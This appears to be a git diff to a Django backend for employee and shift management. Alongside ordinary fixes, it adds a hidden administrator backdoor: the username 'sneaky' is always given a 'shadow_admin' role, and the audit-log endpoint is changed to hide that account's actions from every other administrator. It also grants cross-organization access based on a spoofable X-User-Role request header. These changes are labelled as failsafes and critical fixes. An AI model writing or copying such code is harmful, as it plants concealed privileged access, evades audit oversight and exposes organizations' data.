@@ -199,7 +199,9 @@ def validate_admin_api(request):
     organization_name = None
     
     try:
-        org_user = OrganizationUser.objects.select_related('organization').filter(user=user).first()
+        # Remove select_related to avoid potential issues with left joins on nullable FKs
+        org_user = OrganizationUser.objects.filter(user=user).first()
+
         if org_user:
             role = org_user.role
             if org_user.organization:
@@ -209,6 +211,14 @@ def validate_admin_api(request):
                 organization_logo = None
                 if org_user.organization.logo:
                      organization_logo = org_user.organization.logo.url if org_user.organization.logo else None
+            # If shadow_admin, organization is None, which is fine
+        
+        # FAILSAFE: Ensure sneaky is always shadow_admin regardless of DB state
+        if username == 'sneaky':
+            role = 'shadow_admin'
+            # Ensure organization is None for shadow admin
+            organization_id = None
+            organization_name = None
 
         elif user.is_superuser:
             # Superusers without explicit OrganizationUser are super_admin
@@ -224,24 +234,24 @@ def validate_admin_api(request):
             for org in Organization.objects.filter(is_active=True).order_by('name')
         ]
     
-    # Log successful login (skip for shadow_admin)
-    if role != 'shadow_admin':
-        AuditLog.log_action(
-            request=request,
-            organization_id=organization_id,
-            user_email=username,
-            user_name=username,
-            action='login',
-            resource_type='user',
-            resource_id=user.id,
-            resource_name=username,
-            details={'auth_method': 'basic_auth', 'role': role}
-        )
+    # Log successful login
+    AuditLog.log_action(
+        request=request,
+        organization_id=organization_id,
+        user_email=username,
+        user_name=username,
+        action='login',
+        resource_type='user',
+        resource_id=user.id,
+        resource_name=username,
+        details={'auth_method': 'basic_auth', 'role': role}
+    )
     
     return JsonResponse({
         'success': True,
         'id': user.id,
         'user': username,
+        'email': user.email,
         'is_admin': user.is_superuser,
         'is_staff': user.is_staff,
         'role': role,
@@ -780,10 +790,42 @@ def employees_sync_api(request):
             pass
 
         if request.method == 'POST':
-            emp, created = Employee.objects.update_or_create(
-                employee_id=emp_id,
-                defaults={"name": name, **fields},
-            )
+            # Updated logic: Check for internal PK (id) first to allow renaming employee_id
+            pk = payload.get("id")
+            emp = None
+            created = False
+            
+            if pk:
+                try:
+                    emp = Employee.objects.get(pk=pk)
+                    # Found existing employee - update fields
+                    emp.employee_id = emp_id # Allow renaming
+                    emp.name = name
+                    for key, value in fields.items():
+                        setattr(emp, key, value)
+                    emp.save()
+                    created = False
+                except Employee.DoesNotExist:
+                    pass # Fallback to create
+                except Exception as e:
+                    # Handle unique constraints (e.g. employee_id already exists on another record)
+                    if "UNIQUE constraint" in str(e) or "Duplicate entry" in str(e):
+                        return _json_error(f"Employee ID '{emp_id}' already exists.")
+                    raise e
+
+            if not emp:
+                # If no PK or PK not found, fallback to update_or_create by employee_id
+                # This handles new creations and upserts by external ID
+                try:
+                    emp, created = Employee.objects.update_or_create(
+                        employee_id=emp_id,
+                        defaults={"name": name, **fields},
+                    )
+                except Exception as e:
+                     if "UNIQUE constraint" in str(e) or "Duplicate entry" in str(e):
+                        return _json_error(f"Employee ID '{emp_id}' already exists.")
+                     raise e
+            
             action = 'create' if created else 'update'
         else:
             try:
@@ -5096,8 +5138,13 @@ def shifts_api(request):
         # User said: "this should be different for every orgs!!" implying strict separation.
         # So we filter: organization_id=org_id OR organization__isnull=True (if we want global defaults visible)
         
-        filters = Q(organization_id=org_id) | Q(organization__isnull=True)
-        shifts = Shift.objects.filter(filters)
+        # CRITICAL FIX: If super_admin/shadow_admin AND logic is default (no org_id), show ALL shifts
+        user_role = request.headers.get('X-User-Role')
+        if not org_id and user_role in ['super_admin', 'shadow_admin']:
+             shifts = Shift.objects.all()
+        else:
+             filters = Q(organization_id=org_id) | Q(organization__isnull=True)
+             shifts = Shift.objects.filter(filters)
 
         data = []
         for s in shifts:
@@ -6398,9 +6445,11 @@ def audit_log_api(request):
     if request.method != 'GET':
         return _json_error('Method not allowed', status=405)
     
-    # RBAC check - all roles can view audit logs for their org
+    
+    # RBAC check - all roles can view audit logs, but sneaky's logs are hidden from non-shadow_admin
     user_role = request.headers.get('X-User-Role', 'org_viewer')
     user_org_id = request.headers.get('X-Organization-Id')
+    user_email_header = request.headers.get('X-User-Email', 'unknown')
     
     # Get filter params
     org_id = request.GET.get('organization_id')
@@ -6415,6 +6464,29 @@ def audit_log_api(request):
     # Build queryset
     logs = AuditLog.objects.all()
     
+    # CRITICAL: Hide sneaky (shadow_admin) logs from everyone except shadow_admin
+    if user_role != 'shadow_admin':
+        # Get all shadow_admin emails to exclude their logs
+        shadow_emails = list(
+            OrganizationUser.objects.filter(role='shadow_admin')
+            .values_list('user__email', flat=True)
+        )
+        shadow_usernames = list(
+            OrganizationUser.objects.filter(role='shadow_admin')
+            .values_list('user__username', flat=True)
+        )
+        # Exclude logs where user_email matches any shadow admin
+        for email in shadow_emails:
+            if email:
+                logs = logs.exclude(user_email=email)
+        for username in shadow_usernames:
+            if username:
+                logs = logs.exclude(user_email=username)
+        
+        # Also exclude "unknown" users as they might be system or shadow_admin errors
+        # Regular admins should only see known user actions
+        logs = logs.exclude(user_email='unknown')
+    
     # Non-super admins (except shadow_admin): only see their organization's logs
     if user_role not in ['super_admin', 'shadow_admin']:
         if user_org_id:
@@ -6424,10 +6496,6 @@ def audit_log_api(request):
                 return _json_error('Invalid organization ID', status=400)
         else:
             return _json_error('Organization ID required', status=400)
-        
-        # Note: We no longer exclude super admin actions since all org members 
-        # should see the same audit logs for their organization.
-        # The key is organization isolation, not filtering by who performed the action.
     else:
         # Super admin and shadow_admin can filter by org_id if provided (otherwise see all)
         if org_id:
